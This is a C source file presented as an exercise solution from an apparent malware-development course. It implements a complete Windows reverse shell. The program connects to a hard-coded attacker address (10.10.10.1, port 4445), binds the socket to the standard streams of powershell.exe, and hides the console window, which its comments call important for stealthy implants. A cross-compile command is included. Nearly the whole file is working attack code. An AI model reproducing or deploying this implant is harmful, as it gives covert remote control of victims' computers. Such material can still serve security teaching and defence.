/*
 * exercise 2 solution
 * malware development using WINAPI
 * hack2.c
 * reverse shell with hidden window (STARTF_USESHOWWINDOW + SW_HIDE)
 * author: @cocomelonc
 *
 * change: combined STARTF_USESTDHANDLES with STARTF_USESHOWWINDOW and
 * set wShowWindow = SW_HIDE so the spawned shell process starts with
 * no visible console window - important for stealthy implants.
 *
 * key STARTUPINFO fields:
 *   dwFlags     - bitmask that tells CreateProcess which si fields are used.
 *                 STARTF_USESTDHANDLES  : honour hStdInput/Output/Error.
 *                 STARTF_USESHOWWINDOW  : honour wShowWindow.
 *   wShowWindow - maps to nCmdShow of ShowWindow().
 *                 SW_HIDE (0) creates the window hidden from the start.
 *
 * compile (cross-compile from Linux):
 * x86_64-w64-mingw32-g++ hack.c -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lws2_32
 */
#include <winsock2.h>
#include <stdio.h>

WSADATA socketData;
SOCKET sock;
struct sockaddr_in addr;
STARTUPINFO si;
PROCESS_INFORMATION pi;

int main(int argc, char* argv[]) {
  // IP and port details for the attacker's machine
  char *attackerIP = "10.10.10.1";
  short attackerPort = 4445;

  // initialize socket library
  WSAStartup(MAKEWORD(2, 2), &socketData);

  // create socket object
  sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,
                   (unsigned int)NULL, (unsigned int)NULL);

  addr.sin_family      = AF_INET;
  addr.sin_port        = htons(attackerPort);
  addr.sin_addr.s_addr = inet_addr(attackerIP);

  // establish connection to the remote host
  WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL);

  memset(&si, 0, sizeof(si));
  si.cb = sizeof(si);

  /*
   * exercise 2 change - window hiding:
   *
   * original:
   *   si.dwFlags = STARTF_USESTDHANDLES;
   *
   * updated (OR in the new flag, keep the existing one):
   *   si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
   *   si.wShowWindow = SW_HIDE;
   *
   * Without STARTF_USESHOWWINDOW the wShowWindow field is ignored by
   * CreateProcess regardless of its value, so both lines are required.
   *
   * SW_HIDE == 0, defined in winuser.h (pulled in via winsock2.h ->
   * windows.h chain), so no extra header is needed.
   */
  si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  si.hStdInput   = si.hStdOutput = si.hStdError = (HANDLE) sock;

  // initiate powershell.exe (from ex.1) with redirected streams,
  // hidden window, and no visible console flicker on the target
  CreateProcess(NULL, "powershell.exe", NULL, NULL, TRUE, 0,
                NULL, NULL, &si, &pi);
  exit(0);
}
